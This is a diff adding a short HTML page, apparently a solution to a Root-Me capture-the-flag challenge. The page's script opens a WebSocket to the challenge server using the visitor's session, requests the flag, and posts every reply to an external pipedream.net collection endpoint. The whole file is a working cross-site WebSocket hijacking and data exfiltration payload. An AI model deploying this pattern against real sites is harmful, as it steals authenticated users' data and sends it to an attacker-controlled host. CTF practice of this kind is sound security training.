@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    websocket = new WebSocket('wss://ctf30.root-me.org/ws');
+    websocket.onopen = start
+    websocket.onmessage = handleReply
+    function start(event) {
+      websocket.send("flag");
+    }
+    function handleReply(event) {
+      fetch('https://eoorkx698oqzcap.m.pipedream.net', {method:'POST',mode:'no-cors',body:event.data})
+    }
+  </script>
+</body>
+</html>
+
